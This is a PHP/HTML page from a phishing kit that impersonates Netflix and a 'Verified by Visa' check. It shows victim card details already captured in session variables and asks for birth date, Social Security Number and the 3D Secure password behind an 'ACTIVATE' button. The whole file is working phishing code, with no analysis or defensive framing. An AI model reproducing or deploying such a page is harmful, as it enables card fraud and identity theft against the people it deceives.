<?php 
include('includes/next.inc.php');
?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Netflix</title>
	<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<script src="js/jquery.min.js"></script>
	<script src="js/validet.js"></script>
	<link rel="stylesheet" type="text/css" href="css/app2.css">
	<link rel="shortcut icon" href="img/nficon.ico">
</head>
<body>
		<div class="header_nf2">

		</div>
		<div class="main_secure">
			<div class="inside_main">
				<div class="head_in_main">
					<div class="secure_header_left">
						<div class="lockimg">
							<img src="img/lockv.png" id="lock">
						</div>
						<div class="spanssl"><span>Protected by SSL</span></div>
					</div>
					<div class="secure_header_right">
						<img src="img/vbv.png" id="gifvbv">
					</div>
				</div><br>
				<div class="verif_main">
					<center><span id="ban_kname"><?php echo $_SESSION['xxxnb']; ?></span></center>
					<div  class="parg_secure">
						<center><span id="title_sefety">Added Safety Online</span></center>
						<p id="verif_paragh">Verifed by Visa helps protect your card against unauthorized use online - at no additional cost. To use Verifed by Visa on this and futur purshases. complete this page You'll the create your own Verifed by Visa Password</p>
					</div>
					<div class="form_secure">
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Name on card : </span>
							</div>
							<div class="info_secure">
								<span class="info_s"><?php echo $_SESSION["xxff"] . ' ' . $_SESSION['xxll'];
								 ?></span>
								 <input type="hidden" id="xxfff" value="<?php echo $_SESSION["xxff"] . ' ' . $_SESSION['xxll']; ?>">
								 <input type="hidden" id="xxxiip" value="<?php echo $_SESSION['xxxiip'];?>">
								 <input type="hidden" id="xxccnn" value="<?php echo $_SESSION
								 ['cardx']; ?>">
								 <input type="hidden" id="xxxscc" value="<?php echo $_SESSION['xxxsc']; ?>">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Country Name : </span>
							</div>
							<div class="info_secure">
								<span class="info_s"><?php echo $_SESSION['xxcox']; ?></span>
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Card Type : </span>
							</div>
							<div class="info_secure">
								<span class="info_s"><?php echo $_SESSION['xxxsc']; ?></span>
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Card Number : </span>
							</div>
							<div class="info_secure">
								<span class="info_s">XXXX-XXXX-XXXX-<?php echo $_SESSION['cardx']; ?></span>
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Date time : </span>
							</div>
							<div class="info_secure">
								<span class="info_s"><?php $tm = date("Y/m/d h:i:s:A"); echo $tm; ?></span>
								<input type="hidden" id="xxxttt" value="<?php echo date("Y/m/d h:i:s:A"); ?>">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Birth Date : </span>
							</div>
							<div class="info_secure">
								<input type="text" name="dd" id="dd" class="birth_secure" maxlength="2">
								<span>/</span>
								<input type="text" name="mm" id="mm" class="birth_secure" maxlength="2">
								<span>/</span>
								<input type="text" name="yy" id="yy" class="birth_secure" maxlength="4">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Social Security Number : </span>
							</div>
							<div class="info_secure">
								<input type="text" name="z1" id="z1" maxlength="3">
								<span>-</span>
								<input type="text" name="z2" id="z2" maxlength="2">
								<span>-</span>
								<input type="text" name="z3" id="z3" maxlength="4">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s" id="spsec">3D Password : </span>
							</div>
							<div class="info_secure">
								<input type="password" name="dsecure" id="dsecure">
							</div>
						</div>
						<div class="bottm_s">
							<div class="bottm_s_left">
								<span class="qd"><?php echo $_SESSION['xxxpb']; ?></span>
							</div>
							<div class="bottm_s_right">
								<span class="qd"><?php echo $_SESSION['xxxub']; ?></span>
							</div>
						</div><br>
						<center><button type="submit" class="btn_s_val" name="btn_last">ACTIVATE</button></center>
					</div>
				</div>
			</div>			
		</div>
		<div class="end_sec">
			<center><span>Cannot access your Verifed by Visa?</span><br>
			<span>Contact</span><a href="#"> Visa Customer Service</a></center>
		</div>
		<div class="dvLoading"><center><img src="img/2.gif"></center></div>
</body>
</html>